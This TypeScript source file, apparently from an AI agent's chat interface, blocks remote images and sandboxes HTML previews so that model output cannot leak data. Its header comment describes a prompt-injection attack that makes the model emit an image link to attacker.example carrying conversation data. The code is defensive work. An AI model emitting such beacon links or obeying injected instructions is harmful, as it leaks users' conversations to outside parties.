/**
 * Remote images in model output are an exfiltration beacon: a prompt-injected
 * page or file can make the model emit `![](https://attacker.example/?d=...)`
 * and the browser fetches it with no user action (gptme/gptme#5223).
 *
 * So a remote image is not loaded until the user asks for it. Same-origin,
 * relative, `data:` and `blob:` URLs render directly — they cannot hand
 * conversation content to a third party.
 */

export const REMOTE_IMAGE_PLACEHOLDER_CLASS = 'remote-image-placeholder';

/**
 * CSP for the static HTML preview: inline styles and local images only. Every
 * other fetch (scripts, `fetch`, stylesheets, frames, fonts, media) is blocked.
 */
export const STATIC_PREVIEW_CSP =
  "default-src 'none'; img-src 'self' data: blob:; style-src 'unsafe-inline'; " +
  "font-src data:; media-src data: blob:; form-action 'none'; base-uri 'none'";

/**
 * Elements that reach a host in ways CSP does not cover (`<link rel=preconnect>`
 * and `dns-prefetch`, `<meta http-equiv=refresh>`), or that could hide one from
 * this pass (a `<template>` that becomes a declarative shadow root).
 */
const STATIC_PREVIEW_STRIPPED = 'link, meta, base, template';

function pageUrl(): string {
  return typeof window !== 'undefined' ? window.location.href : 'http://localhost';
}

/** True when loading `url` would send a request to another origin. */
export function isRemoteImageUrl(url: string, page: string = pageUrl()): boolean {
  try {
    // Hand the raw string to the URL parser, which is what the browser runs on
    // `src`: it strips leading/trailing C0 controls and spaces, drops
    // tabs/newlines and reads `\` as `/`. A pre-check that normalizes any less
    // than the parser does is a bypass.
    const base = new URL(page);
    const parsed = new URL(url, base);
    // `data:`, `blob:` and app-scheme URLs send nothing to a third party.
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
    return parsed.origin !== base.origin;
  } catch {
    // An unparseable URL is treated as remote: fail closed.
    return true;
  }
}

function imageSourceLabel(src: string): string {
  try {
    return new URL(src, pageUrl()).host;
  } catch {
    return 'remote host';
  }
}

/**
 * Placeholder shown instead of a remote image. It carries no `src`, so the
 * browser makes no request; clicking swaps in the real `<img>`.
 */
export function createRemoteImagePlaceholder(src: string): HTMLButtonElement {
  const button = document.createElement('button');
  button.type = 'button';
  button.className = REMOTE_IMAGE_PLACEHOLDER_CLASS;
  button.dataset.remoteSrc = src;
  button.title = src;
  button.textContent = `Remote image from ${imageSourceLabel(src)} — click to load`;
  button.setAttribute('aria-label', `Load remote image from ${imageSourceLabel(src)}`);
  button.addEventListener('click', (event) => {
    // A linked image must only load: the click must not also open the link.
    event.preventDefault();
    const img = document.createElement('img');
    img.setAttribute('src', src);
    img.setAttribute('alt', '');
    button.replaceWith(img);
  });
  return button;
}

function stripPreviewElements(html: string): string {
  const doc = new DOMParser().parseFromString(`<!doctype html>${html}`, 'text/html');
  doc.querySelectorAll(STATIC_PREVIEW_STRIPPED).forEach((el) => el.remove());
  return doc.documentElement.outerHTML;
}

/**
 * `srcDoc` for the default HTML preview. The preview is model output too, so
 * opening it must not send anything to a remote host. Render it in an iframe
 * with an empty `sandbox` (no scripts, forms or popups): CSP cannot stop a
 * script from navigating the frame to a remote URL.
 */
export function staticHtmlPreviewSrcDoc(html: string): string {
  // Serializing and reparsing can yield elements the first parse did not, so
  // strip until the markup is stable; give up (empty preview) if it never is.
  let body = stripPreviewElements(html);
  for (let i = 0; i < 3; i++) {
    const next = stripPreviewElements(body);
    if (next === body) {
      return (
        '<!doctype html>' +
        `<meta http-equiv="Content-Security-Policy" content="${STATIC_PREVIEW_CSP}">` +
        '<meta http-equiv="x-dns-prefetch-control" content="off">' +
        body
      );
    }
    body = next;
  }
  return '';
}
